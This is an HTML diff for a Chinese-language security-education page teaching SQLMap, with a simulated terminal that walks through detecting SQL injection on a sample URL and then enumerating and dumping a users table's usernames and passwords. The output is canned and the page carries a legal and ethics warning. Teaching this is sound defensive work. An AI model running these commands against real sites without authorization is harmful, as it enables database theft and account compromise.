@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQLMap 自動化注入 | 資安模擬學習</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        /* --- 1. SQLMap 主題美術風格 (Meltdown Gold) --- */
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Consolas', 'Monaco', 'Courier New', monospace; }
+        body { line-height: 1.6; color: #ffccaa; background-color: #0d0500; position: relative; overflow-x: hidden; font-family: 'Segoe UI', sans-serif; }
+
+        /* 背景特效：二進位數據流 */
+        .db-background {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
+            background: 
+                linear-gradient(rgba(10, 5, 0, 0.95), rgba(10, 5, 0, 0.95)),
+                repeating-linear-gradient(0deg, transparent, transparent 1px, #332200 1px, #332200 2px);
+            background-size: 100% 30px;
+        }
+        
+        .binary-stream {
+            position: fixed; top: -100%; color: rgba(255, 170, 0, 0.1); font-family: monospace; font-size: 14px;
+            animation: binaryFall linear infinite; user-select: none;
+        }
+        .binary-stream:nth-child(1) { left: 10%; animation-duration: 5s; animation-delay: 0s; }
+        .binary-stream:nth-child(2) { left: 30%; animation-duration: 7s; animation-delay: 2s; }
+        .binary-stream:nth-child(3) { left: 50%; animation-duration: 4s; animation-delay: 1s; }
+        .binary-stream:nth-child(4) { left: 70%; animation-duration: 6s; animation-delay: 3s; }
+        .binary-stream:nth-child(5) { left: 90%; animation-duration: 5.5s; animation-delay: 0.5s; }
+
+        @keyframes binaryFall {
+            0% { transform: translateY(0); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(120vh); opacity: 0; }
+        }
+
+        /* 容器 */
+        .container { width: 90%; max-width: 1400px; margin: 0 auto; padding: 20px; position: relative; }
+
+        /* 頁首 */
+        header {
+            background: rgba(30, 15, 0, 0.95); padding: 4rem 0; text-align: center; margin-bottom: 2rem;
+            border-radius: 12px; border: 1px solid #ffaa00; box-shadow: 0 0 30px rgba(255, 170, 0, 0.2);
+            position: relative; overflow: hidden;
+        }
+        header h1 {
+            font-size: 2.8rem; margin-bottom: 1rem; color: #ffaa00;
+            text-shadow: 0 0 15px rgba(255, 170, 0, 0.6); letter-spacing: 2px;
+        }
+        header p { font-size: 1.2rem; color: #ffdd99; max-width: 800px; margin: 0 auto; }
+
+        /* 導覽列 */
+        nav {
+            background: #1a0d00; padding: 1rem; border-radius: 8px; border: 1px solid #ffaa00;
+            position: sticky; top: 0; z-index: 100; margin-bottom: 30px; box-shadow: 0 5px 20px rgba(0,0,0,0.8);
+        }
+        nav ul { display: flex; justify-content: center; list-style: none; gap: 20px; flex-wrap: wrap; }
+        nav a {
+            text-decoration: none; color: #ffccaa; font-weight: bold; padding: 8px 16px;
+            border-radius: 4px; transition: 0.3s; border: 1px solid transparent;
+        }
+        nav a:hover { background: rgba(255, 170, 0, 0.2); color: #fff; border-color: #ffaa00; }
+
+        /* --- 佈局 --- */
+        .grid-layout { display: grid; grid-template-columns: 2fr 1fr; gap: 30px; margin-bottom: 40px; }
+        .full-width { width: 100%; margin-bottom: 2rem; }
+        @media (max-width: 1024px) { .grid-layout { grid-template-columns: 1fr; } }
+
+        /* 卡片樣式 */
+        article {
+            background: rgba(20, 10, 0, 0.9); padding: 30px; border-radius: 8px; border: 1px solid #664400; margin-bottom: 30px;
+        }
+        h2 { color: #ffaa00; margin-bottom: 20px; padding-bottom: 10px; border-bottom: 1px solid #664400; font-size: 1.8rem; display: flex; align-items: center; gap: 10px; }
+        h3 { color: #ffcc00; margin: 25px 0 15px 0; font-size: 1.4rem; }
+        p, li { margin-bottom: 10px; color: #e6e6e6; font-size: 1.05rem; }
+        ul { margin-left: 20px; }
+
+        /* 側邊欄 */
+        aside {
+            background: rgba(20, 10, 0, 0.9); padding: 25px; border-radius: 8px; border: 1px solid #ffaa00;
+            height: fit-content; box-shadow: 0 0 20px rgba(255, 170, 0, 0.1); position: sticky; top: 100px;
+        }
+
+        /* 提示框 */
+        .info-box { background: rgba(255, 170, 0, 0.1); border-left: 5px solid #ffaa00; padding: 20px; margin: 20px 0; border-radius: 4px; }
+        .danger-box { background: rgba(255, 50, 50, 0.15); border-left: 5px solid #ff3333; padding: 20px; margin: 20px 0; border-radius: 4px; }
+
+        /* --- 模擬器樣式 (SQLMap Style) --- */
+        .simulator-wrapper {
+            background: #000; border: 2px solid #ffaa00; border-radius: 12px; overflow: hidden;
+            box-shadow: 0 0 50px rgba(255, 170, 0, 0.2); margin: 20px 0;
+            display: flex; flex-direction: column; height: 800px;
+        }
+
+        .sim-header {
+            background: #1a0d00; padding: 12px 20px; border-bottom: 1px solid #ffaa00;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+
+        .sim-grid {
+            display: grid; grid-template-columns: 240px 1fr 340px; flex: 1; overflow: hidden;
+        }
+
+        /* 控制區 */
+        .sim-controls { background: #0f0800; border-right: 1px solid #664400; padding: 20px; overflow-y: auto; }
+        .sim-btn {
+            width: 100%; padding: 15px; margin-bottom: 12px; background: rgba(255, 170, 0, 0.05); border: 1px solid #664400;
+            color: #ffccaa; text-align: left; cursor: pointer; border-radius: 6px; transition: all 0.2s;
+        }
+        .sim-btn:hover { background: rgba(255, 170, 0, 0.15); color: #fff; border-color: #ffaa00; }
+        .sim-btn.active { background: rgba(255, 170, 0, 0.25); border-color: #ffaa00; color: #fff; border-left: 4px solid #ffaa00; box-shadow: 0 0 15px rgba(255, 170, 0, 0.3); font-weight: bold; }
+        .sim-btn strong { display: block; font-size: 1rem; margin-bottom: 4px; }
+
+        /* 終端機 */
+        .sim-terminal {
+            background: #000; padding: 0; display: flex; flex-direction: column; 
+            font-family: 'Consolas', 'Courier New', monospace; position: relative;
+        }
+        .term-body { 
+            flex: 1; padding: 20px; overflow-y: auto; color: #ffcc00; 
+            font-size: 1rem; line-height: 1.5; white-space: pre-wrap; 
+        }
+        .prompt { color: #fff; font-weight: bold; margin-right: 10px; }
+        .cursor { display: inline-block; width: 10px; height: 18px; background: #ffaa00; animation: blink 1s infinite; vertical-align: text-bottom; }
+
+        /* 解析區 */
+        .sim-decoder { background: #1a0d00; border-left: 1px solid #664400; display: flex; flex-direction: column; }
+        .decoder-header { padding: 15px; background: #0f0800; border-bottom: 1px solid #664400; color: #ffaa00; font-weight: bold; font-size: 1.1rem; }
+        .decoder-content { padding: 25px; flex: 1; overflow-y: auto; }
+        
+        .explanation-card { 
+            background: rgba(255, 170, 0, 0.08); border-left: 4px solid #ffaa00; 
+            padding: 20px; border-radius: 4px; animation: slideIn 0.3s ease;
+        }
+        .analogy { 
+            margin-top: 15px; padding: 10px; background: rgba(255, 255, 255, 0.05); 
+            border-radius: 4px; color: #ffdd99; font-style: italic; border: 1px dashed #ffaa00;
+        }
+
+        /* 重置按鈕 */
+        .reset-btn {
+            background: transparent; border: 1px solid #ffaa00; color: #ffaa00; 
+            padding: 4px 12px; font-size: 0.8rem; border-radius: 4px; cursor: pointer; transition: 0.3s;
+        }
+        .reset-btn:hover { background: #ffaa00; color: #fff; }
+
+        /* [修復] 表格排版樣式 (琥珀金版) */
+        .tech-table { 
+            width: 100%; border-collapse: collapse; margin-top: 15px; 
+            background: rgba(255, 170, 0, 0.02); border: 1px solid #664400;
+        }
+        .tech-table th { 
+            text-align: left; padding: 12px; 
+            background: rgba(255, 170, 0, 0.1); color: #ffaa00; 
+            border-bottom: 2px solid #ffaa00; 
+        }
+        .tech-table td { 
+            padding: 12px; border-bottom: 1px dashed #664400; 
+            vertical-align: top; font-size: 0.95rem; color: #e6e6e6;
+        }
+        .tech-table tr:last-child td { border-bottom: none; }
+        .tech-table tr:hover { background: rgba(255, 170, 0, 0.05); }
+
+        /* [新增] 代碼膠囊樣式 */
+        .code-pill {
+            display: inline-block;
+            background: #332200;
+            color: #ffaa00;
+            border: 1px solid #ffaa00;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-weight: bold;
+            font-size: 0.9rem;
+            white-space: nowrap;
+        }
+
+        @keyframes blink { 50% { opacity: 0; } }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* RWD */
+        @media (max-width: 1200px) { .sim-grid { grid-template-columns: 200px 1fr 280px; } }
+        @media (max-width: 900px) {
+            .sim-grid { grid-template-columns: 1fr; grid-template-rows: auto 400px auto; }
+            .sim-decoder { border-left: none; border-top: 1px solid #664400; height: 350px; }
+            .simulator-wrapper { height: auto; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="db-background"></div>
+    <div class="binary-stream">101010101010101010</div>
+    <div class="binary-stream">001100110011001100</div>
+    <div class="binary-stream">111000111000111000</div>
+    <div class="binary-stream">010101010101010101</div>
+    <div class="binary-stream">100010001000100010</div>
+
+    <header>
+        <div class="container">
+            <h1><i class="fas fa-database"></i> SQLMap 自動化注入</h1>
+            <p> SQL 注入利器 • 從檢測漏洞到脫取資料庫</p>
+        </div>
+    </header>
+
+    <nav>
+        <div class="container">
+            <ul>
+                <li><a href="#intro">工具介紹</a></li>
+                <li><a href="#install">環境準備</a></li>
+                <li><a href="#simulation">注入演示</a></li>
+                <li><a href="#syntax">參數語法</a></li>
+                <li><a href="#ethics">法律規範</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <div class="container">
+        
+        <div class="grid-layout">
+            <div class="content-left">
+                <article id="intro">
+                    <h2><i class="fas fa-syringe"></i> 什麼是 SQLMap？</h2>
+                    <p><strong>SQLMap</strong> 是一款開源的滲透測試工具，專門用來自動化檢測和利用 SQL 注入 (SQL Injection) 漏洞，並接管資料庫伺服器。</p>
+                    <p>它是資料庫滲透領域的「瑞士軍刀」，支援 MySQL, Oracle, PostgreSQL, Microsoft SQL Server 等幾乎多種資料庫。</p>
+                    
+                    <div class="info-box">
+                        <p><strong><i class="fas fa-bug"></i> SQL 注入原理：</strong></p>
+                        <p>當網頁應用程式沒有檢查使用者輸入的內容，駭客可以在輸入框（或網址參數）中插入惡意的 SQL 指令，騙過資料庫執行，從而竊取資料或繞過登入。</p>
+                    </div>
+                </article>
+
+                <article id="install">
+                    <h2><i class="fas fa-terminal"></i> 安裝與啟動</h2>
+                    <p>SQLMap 是 Python 編寫的工具，內建於 Kali Linux。</p>
+                    <pre><code style="color:#ffaa00;"># 安裝 (若未安裝)
+sudo apt install sqlmap
+
+# 更新到最新版
+sudo sqlmap --update
+
+# 檢查版本
+sqlmap --version</code></pre>
+                </article>
+            </div>
+
+            <aside>
+                <div style="margin-bottom: 30px;">
+                    <h3 style="margin-top:0; border-bottom:1px solid #664400; padding-bottom:10px;">
+                        <i class="fas fa-laptop-code"></i> 實驗配置
+                    </h3>
+                    <ul style="list-style: none; margin: 0; padding: 0;">
+                        <li style="padding: 10px 0; border-bottom: 1px solid #664400;">
+                            <i class="fas fa-check" style="color:#ffaa00; margin-right:8px;"></i> 攻擊機: Kali Linux
+                        </li>
+                        <li style="padding: 10px 0; border-bottom: 1px solid #664400;">
+                            <i class="fas fa-bullseye" style="color:#ffaa00; margin-right:8px;"></i> 靶機: testphp.vulnweb.com
+                        </li>
+                        <li style="padding: 10px 0; border-bottom: 1px solid #664400;">
+                            <i class="fas fa-link" style="color:#ffcc00; margin-right:8px;"></i> 參數: id=1 (注入點)
+                        </li>
+                        <li style="padding: 10px 0;">
+                            <i class="fas fa-database" style="color:#ffaa00; margin-right:8px;"></i> 資料庫: MySQL
+                        </li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 style="margin-top:0; border-bottom:1px solid #664400; padding-bottom:10px;">
+                        <i class="fas fa-book"></i> 章節導覽
+                    </h3>
+                    <ul style="list-style: none; margin: 0; padding: 0;">
+                        <li style="padding: 8px 0;"><a href="#intro" style="color:#ffdd99; text-decoration:none;">1. 工具介紹</a></li>
+                        <li style="padding: 8px 0;"><a href="#install" style="color:#ffdd99; text-decoration:none;">2. 環境準備</a></li>
+                        <li style="padding: 8px 0;"><a href="#simulation" style="color:#ffdd99;  text-decoration:none;">3. 注入演示</a></li>
+                        <li style="padding: 8px 0;"><a href="#syntax" style="color:#ffdd99; text-decoration:none;">4. 參數語法</a></li>
+                        <li style="padding: 8px 0;"><a href="#ethics" style="color:#ffdd99; text-decoration:none;">5. 法律規範</a></li>
+                    </ul>
+                </div>
+            </aside>
+        </div>
+
+        <div class="full-width">
+            <article id="simulation" style="border: 2px solid #ffaa00; box-shadow: 0 0 30px rgba(255, 170, 0, 0.1);">
+                <h2><i class="fas fa-code-branch"></i> 互動虛擬實驗室</h2>
+                <p>現在，我們發現了一個有漏洞的網址：<code>http://vuln.com/product.php?id=1</code>。我們將利用 SQLMap 一步步將資料庫「掏空」。</p>
+                
+                <div class="simulator-wrapper">
+                    <div class="sim-header">
+                        <div><i class="fas fa-terminal"></i> KALI ROOT TERMINAL</div>
+                        <button class="reset-btn" onclick="resetSim()">
+                            <i class="fas fa-redo"></i> 重置模擬器
+                        </button>
+                    </div>
+
+                    <div class="sim-grid">
+                        <div class="sim-controls">
+                            <button class="sim-btn" onclick="runStep(1)" id="btn-1">
+                                <strong>Step 1: 檢測漏洞 (Detect)</strong><span>sqlmap -u "url"</span>
+                            </button>
+                            <button class="sim-btn" onclick="runStep(2)" id="btn-2">
+                                <strong>Step 2: 列出資料庫 (DBS)</strong><span>--dbs</span>
+                            </button>
+                            <button class="sim-btn" onclick="runStep(3)" id="btn-3">
+                                <strong>Step 3: 列出資料表 (Tables)</strong><span>-D acuart --tables</span>
+                            </button>
+                            <button class="sim-btn" onclick="runStep(4)" id="btn-4">
+                                <strong>Step 4: 列出欄位 (Columns)</strong><span>-T users --columns</span>
+                            </button>
+                            <button class="sim-btn" onclick="runStep(5)" id="btn-5" style="border-left: 3px solid #ff3333; background: rgba(255,0,0,0.05);">
+                                <strong style="color:#ff3333;">Step 5: 脫取資料 (Dump)</strong><span>--dump</span>
+                            </button>
+                        </div>
+
+                        <div class="sim-terminal">
+                            <div class="term-body" id="term-body">
+                                <div>Kali GNU/Linux Rolling [Version 2024.1]</div>
+                                <br>
+                                <div id="prompt-line" style="display:flex; flex-wrap:wrap;">
+                                    <span class="prompt" id="prompt-text">root@kali:~#</span>
+                                    <span id="typing-area"></span><span class="cursor"></span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="sim-decoder">
+                            <div class="decoder-header"><i class="fas fa-search-plus"></i> 注入解析</div>
+                            <div class="decoder-content" id="decoder-content">
+                                <div style="text-align: center; color: #ffdd99; margin-top: 100px;">
+                                    <i class="fas fa-database fa-3x" style="margin-bottom: 20px;"></i><br>
+                                    準備就緒<br>點擊左側 <strong>Step 1</strong> 開始檢測
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </article>
+        </div>
+
+        <div class="grid-layout">
+            
+            <div class="content-left">
+                <article id="syntax">
+                    <h2><i class="fas fa-code"></i> 攻擊流程參數</h2>
+                    <p>SQLMap 的參數設計非常有邏輯，通常是從外到內一層層剝開：</p>
+                    
+                    <table class="tech-table">
+                        <thead>
+                            <tr>
+                                <th width="30%">參數</th>
+                                <th>功能說明</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><span class="code-pill">-u "URL"</span></td>
+                                <td>指定目標網址 (Target URL)。</td>
+                            </tr>
+                            <tr>
+                                <td><span class="code-pill">--dbs</span></td>
+                                <td>列出所有<strong>資料庫名稱</strong> (Databases)。</td>
+                            </tr>
+                            <tr>
+                                <td><span class="code-pill">-D [db]</span></td>
+                                <td>指定要攻擊的資料庫名稱。</td>
+                            </tr>
+                            <tr>
+                                <td><span class="code-pill">--tables</span></td>
+                                <td>列出指定資料庫中的<strong>資料表</strong> (Tables)。</td>
+                            </tr>
+                            <tr>
+                                <td><span class="code-pill">-T [table]</span></td>
+                                <td>指定要攻擊的資料表名稱。</td>
+                            </tr>
+                            <tr>
+                                <td><span class="code-pill">--columns</span></td>
+                                <td>列出指定資料表中的<strong>欄位</strong> (Columns)。</td>
+                            </tr>
+                            <tr>
+                                <td><span class="code-pill">--dump</span></td>
+                                <td><strong>脫庫</strong>。將指定內容全部下載並顯示出來。</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </article>
+            </div>
+
+            <div class="content-right">
+                <article id="ethics">
+                    <h2><i class="fas fa-gavel"></i> 法律與道德</h2>
+                    
+                    <div class="danger-box">
+                        <h3><i class="fas fa-exclamation-triangle"></i> 絕對禁止</h3>
+                        <p>未經授權對網站進行 SQL 注入測試是嚴重犯罪，違反<strong>刑法第 358 條</strong>，且可能導致資料庫損毀。</p>
+                    </div>
+
+                    <div style="margin-bottom:20px;">
+                        <h4 style="color:#ffaa00; margin-bottom:10px;">合法練習平台</h4>
+                        <ul>
+                            <li>DVWA (Damn Vulnerable Web App)</li>
+                            <li>OWASP Juice Shop</li>
+                            <li>VulnHub 靶機</li>
+                        </ul>
+                    </div>
+
+                    <div class="info-box" style="text-align: center;">
+                        <h4 style="margin-top: 0; color: #fff;">資安倫理</h4>
+                        <p>請愛護資料庫，不要隨意 Drop Table。</p>
+                    </div>
+                </article>
+            </div>
+        </div>
+
+    </div>
+
+    <footer>
+        <div class="container">
+            <p>© 2025 SQLMap 自動化注入 | 僅供資安教育用途</p>
+            <p>請務必遵守法律與道德規範</p>
+        </div>
+    </footer>
+
+    <script>
+        const termBody = document.getElementById('term-body');
+        const promptLine = document.getElementById('prompt-line');
+        const promptText = document.getElementById('prompt-text');
+        const typingArea = document.getElementById('typing-area');
+        const decoderContent = document.getElementById('decoder-content');
+        
+        let isTyping = false;
+        let typingTimer = null;
+        let currentPromptStr = "root@kali:~#";
+
+        // 模擬數據
+        const scenarios = {
+            1: {
+                cmd: "sqlmap -u \"http://vuln.com/product.php?id=1\" --batch",
+                info: `
+                    <div class="explanation-card">
+                        <h4>Step 1: 檢測漏洞 (Detect)</h4>
+                        <p style="color:#ccc;">我們給 SQLMap 一個網址，並告訴它自動回答 Yes (<code>--batch</code>)。</p>
+                        <p style="color:#ccc;">SQLMap 會嘗試各種注入 payload（如加單引號 <code>'</code>），觀察網頁回應是否異常。</p>
+                        <div class="analogy">
+                            <strong>💡 白話文比喻：</strong>你對著對講機亂按按鈕，看看哪一種按法會讓門禁系統當機或出現錯誤訊息。
+                        </div>
+                    </div>`,
+                output: [
+                    { text: "sqlmap identified the following injection point(s) with a total of 56 HTTP(s) requests:", wait: 500 },
+                    { text: "---", wait: 600 },
+                    { text: "Parameter: id (GET)", style: "font-weight:bold; color:#ffaa00;", wait: 800 },
+                    { text: "    Type: boolean-based blind", wait: 1000 },
+                    { text: "    Title: AND boolean-based blind - WHERE or HAVING clause", wait: 1100 },
+                    { text: "    Payload: id=1 AND 8888=8888", color: "#00ff00", wait: 1200 },
+                    { text: "---", wait: 1500 },
+                    { text: "[INFO] the back-end DBMS is 'MySQL'", color: "#00ff00", wait: 1800 },
+                    { text: "[INFO] fetching banner", wait: 2000 },
+                    { text: "web application technology: PHP 5.6.40, Apache 2.4.38", wait: 2200 },
+                    { text: "back-end DBMS: MySQL >= 5.0.12", wait: 2400 },
+                    { text: "root@kali:~#", type: "prompt", wait: 2800 }
+                ]
+            },
+            2: {
+                cmd: "sqlmap -u \"http://vuln.com/product.php?id=1\" --dbs",
+                info: `
+                    <div class="explanation-card">
+                        <h4>Step 2: 列出資料庫 (Enumerate DBs)</h4>
+                        <p style="color:#ccc;">確認有漏洞後，我們問系統：「你們有哪些資料庫？」(<code>--dbs</code>)</p>
+                        <p style="color:#ccc;">結果顯示有兩個：<code>information_schema</code> (系統預設) 和 <code>acuart</code> (目標網站資料庫)。</p>
+                        <div class="analogy">
+                            <strong>💡 白話文比喻：</strong>你進入了圖書館，問管理員：「這裡有哪些分類的書櫃？」管理員回答：「有『系統管理』和『藝術品(acuart)』兩個櫃子。」
+                        </div>
+                    </div>`,
+                output: [
+                    { text: "[INFO] fetching database names", wait: 500 },
+                    { text: "available databases [2]:", color: "#ffaa00", wait: 1000 },
+                    { text: "[*] information_schema", wait: 1200 },
+                    { text: "[*] acuart", color: "#00ff00", style: "font-weight:bold;", wait: 1400 },
+                    { text: "root@kali:~#", type: "prompt", wait: 1800 }
+                ]
+            },
+            3: {
+                cmd: "sqlmap -u \"...\" -D acuart --tables",
+                info: `
+                    <div class="explanation-card">
+                        <h4>Step 3: 列出資料表 (Tables)</h4>
+                        <p style="color:#ccc;">我們鎖定 <code>acuart</code> 資料庫，想看看裡面有哪些表 (<code>-D acuart --tables</code>)。</p>
+                        <p style="color:#ccc;">發現了 <code>users</code> 表！這肯定是放帳號密碼的地方。</p>
+                        <div class="analogy">
+                            <strong>💡 白話文比喻：</strong>你走到『藝術品』櫃子前，問：「這裡面有哪些書？」管理員說：「有『藝術家』、『購物車』和『使用者名單』。」
+                        </div>
+                    </div>`,
+                output: [
+                    { text: "[INFO] fetching tables for database: 'acuart'", wait: 500 },
+                    { text: "Database: acuart", color: "#ffaa00", wait: 800 },
+                    { text: "[8 tables]", wait: 1000 },
+                    { text: "+-----------+", wait: 1100 },
+                    { text: "| artists   |", wait: 1200 },
+                    { text: "| carts     |", wait: 1300 },
+                    { text: "| categ     |", wait: 1400 },
+                    { text: "| featured  |", wait: 1500 },
+                    { text: "| guestbook |", wait: 1600 },
+                    { text: "| pictures  |", wait: 1700 },
+                    { text: "| products  |", wait: 1800 },
+                    { text: "| users     |", color: "#ff3333", style: "font-weight:bold;", wait: 1900 },
+                    { text: "+-----------+", wait: 2000 },
+                    { text: "root@kali:~#", type: "prompt", wait: 2500 }
+                ]
+            },
+            4: {
+                cmd: "sqlmap -u \"...\" -D acuart -T users --columns",
+                info: `
+                    <div class="explanation-card">
+                        <h4>Step 4: 列出欄位 (Columns)</h4>
+                        <p style="color:#ccc;">鎖定 <code>users</code> 表，查看欄位名稱 (<code>-T users --columns</code>)。</p>
+                        <p style="color:#ccc;">我們找到了 <code>uname</code> (帳號)、<code>pass</code> (密碼)、<code>email</code> 等關鍵欄位。</p>
+                        <div class="analogy">
+                            <strong>💡 白話文比喻：</strong>你翻開『使用者名單』這本書的目錄，發現上面寫著：「第一欄：姓名、第二欄：密碼、第三欄：信箱...」
+                        </div>
+                    </div>`,
+                output: [
+                    { text: "[INFO] fetching columns for table 'users' in database 'acuart'", wait: 500 },
+                    { text: "Database: acuart", color: "#ffaa00", wait: 800 },
+                    { text: "Table: users", color: "#ffaa00", wait: 1000 },
+                    { text: "[8 columns]", wait: 1200 },
+                    { text: "+---------+-------------+", wait: 1300 },
+                    { text: "| Column  | Type        |", wait: 1400 },
+                    { text: "+---------+-------------+", wait: 1500 },
+                    { text: "| address | mediumtext  |", wait: 1600 },
+                    { text: "| cart    | varchar(50) |", wait: 1700 },
+                    { text: "| cc      | varchar(50) |", wait: 1800 },
+                    { text: "| email   | varchar(50) |", wait: 1900 },
+                    { text: "| name    | varchar(50) |", wait: 2000 },
+                    { text: "| pass    | varchar(50) |", color: "#ff3333", style: "font-weight:bold;", wait: 2100 },
+                    { text: "| phone   | varchar(50) |", wait: 2200 },
+                    { text: "| uname   | varchar(50) |", color: "#ff3333", style: "font-weight:bold;", wait: 2300 },
+                    { text: "+---------+-------------+", wait: 2400 },
+                    { text: "root@kali:~#", type: "prompt", wait: 2800 }
+                ]
+            },
+            5: {
+                cmd: "sqlmap -u \"...\" -D acuart -T users -C uname,pass --dump",
+                info: `
+                    <div class="explanation-card" style="border-color:#ff3333; background:rgba(255,0,0,0.1);">
+                        <h4 style="color:#ff3333;">Step 5: 脫取資料 (Dump)</h4>
+                        <p style="color:#ccc;">最後一步，我們要求 SQLMap 把 <code>uname</code> 和 <code>pass</code> 的內容全部倒出來 (<code>--dump</code>)。</p>
+                        <p style="color:#ccc;">駭客成功取得了網站管理員的帳號密碼！</p>
+                        <div class="analogy">
+                            <strong>⚠️ 震撼教育：</strong>你告訴管理員：「把這本書的內容全部影印一份給我。」管理員乖乖照做，你拿到了所有人的帳號密碼。
+                        </div>
+                    </div>`,
+                output: [
+                    { text: "[INFO] fetching entries for table 'users' in database 'acuart'", wait: 500 },
+                    { text: "[INFO] analyzing table dump for possible password hashes", wait: 1000 },
+                    { text: "Database: acuart", color: "#ffaa00", wait: 1200 },
+                    { text: "Table: users", color: "#ffaa00", wait: 1400 },
+                    { text: "[1 entry]", wait: 1600 },
+                    { text: "+-------+--------+", wait: 1800 },
+                    { text: "| uname | pass   |", wait: 2000 },
+                    { text: "+-------+--------+", wait: 2200 },
+                    { text: "| test  | test   |", color: "#00ff00", style: "font-weight:bold;", wait: 2500 },
+                    { text: "+-------+--------+", wait: 2800 },
+                    { text: "[INFO] table 'acuart.users' dumped to CSV file", wait: 3200 },
+                    { text: "root@kali:~#", type: "prompt", wait: 3500 }
+                ]
+            }
+        };
+
+        function runStep(id) {
+            if (isTyping) return;
+            isTyping = true;
+            
+            const data = scenarios[id];
+            document.querySelectorAll('.sim-btn').forEach(b => b.classList.remove('active'));
+            document.getElementById('btn-' + id).classList.add('active');
+
+            typeCommand(data.cmd, () => {
+                addHistoryLog(currentPromptStr, data.cmd);
+                decoderContent.innerHTML = data.info;
+                
+                let maxWait = 0;
+                if(data.output) {
+                    data.output.forEach(line => {
+                        setTimeout(() => {
+                            if(line.type === 'prompt') {
+                                updatePrompt(line.text);
+                            } else {
+                                printText(line.text, line.color, line.style);
+                            }
+                        }, line.wait);
+                        if(line.wait > maxWait) maxWait = line.wait;
+                    });
+                }
+                setTimeout(() => {
+                    isTyping = false;
+                }, maxWait + 200);
+            });
+        }
+
+        function typeCommand(text, callback) {
+            typingArea.textContent = "";
+            let i = 0;
+            typingTimer = setInterval(() => {
+                typingArea.textContent += text.charAt(i);
+                i++;
+                if (i >= text.length) {
+                    clearInterval(typingTimer);
+                    setTimeout(() => {
+                        typingArea.textContent = ""; 
+                        callback();
+                    }, 300);
+                }
+            }, 30);
+        }
+
+        function addHistoryLog(p, c) {
+            const div = document.createElement('div');
+            div.innerHTML = `<span class="prompt">${p}</span> ${c}`;
+            termBody.insertBefore(div, promptLine);
+            scrollToBottom();
+        }
+
+        function printText(text, color, style) {
+            const div = document.createElement('div');
+            if (text.startsWith("+") || text.startsWith("|")) {
+                div.innerHTML = `<pre style="margin:0;">${text}</pre>`;
+            } else {
+                div.textContent = text;
+            }
+            if(color) div.style.color = color;
+            if(style) div.setAttribute('style', div.getAttribute('style') + `; ${style}`);
+            termBody.insertBefore(div, promptLine);
+            scrollToBottom();
+        }
+
+        function updatePrompt(text) {
+            currentPromptStr = text;
+            promptText.textContent = text;
+            scrollToBottom();
+        }
+
+        function scrollToBottom() {
+            termBody.scrollTop = termBody.scrollHeight;
+        }
+
+        function resetSim() {
+            if(isTyping) return;
+            const logs = termBody.querySelectorAll('div:not(#prompt-line)');
+            for(let i=1; i<logs.length; i++) logs[i].remove();
+            
+            const welcome1 = document.createElement('div');
+            welcome1.textContent = "Kali GNU/Linux Rolling [Version 2024.1]";
+            termBody.insertBefore(welcome1, promptLine);
+            const br = document.createElement('div');
+            br.innerHTML = "<br>";
+            termBody.insertBefore(br, promptLine);
+
+            updatePrompt("root@kali:~#");
+            typingArea.textContent = "";
+
+            decoderContent.innerHTML = `
+                <div style="text-align: center; color: #ffdd99; margin-top: 100px;">
+                    <i class="fas fa-database fa-3x" style="margin-bottom: 20px;"></i><br>
+                    準備就緒<br>點擊左側 <strong>Step 1</strong> 開始檢測
+                </div>`;
+            document.querySelectorAll('.sim-btn').forEach(b => b.classList.remove('active'));
+        }
+    </script>
+</body>
+</html>
